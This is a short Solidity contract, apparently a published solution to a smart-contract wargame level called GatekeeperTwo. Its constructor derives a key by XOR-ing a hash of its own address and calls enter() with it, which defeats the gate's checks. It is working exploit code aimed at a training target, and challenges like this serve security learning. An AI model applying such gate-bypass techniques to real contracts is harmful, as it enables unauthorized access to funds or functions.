/**
 *Submitted for verification at Etherscan.io on 2022-12-24
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract HackGate2 {
    constructor(address GatekeeperTwo) {
        bytes8 _key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        (bool success, ) = GatekeeperTwo.call(abi.encodeWithSignature("enter(bytes8)", _key));
        require(success, "not success tx!");
    }
}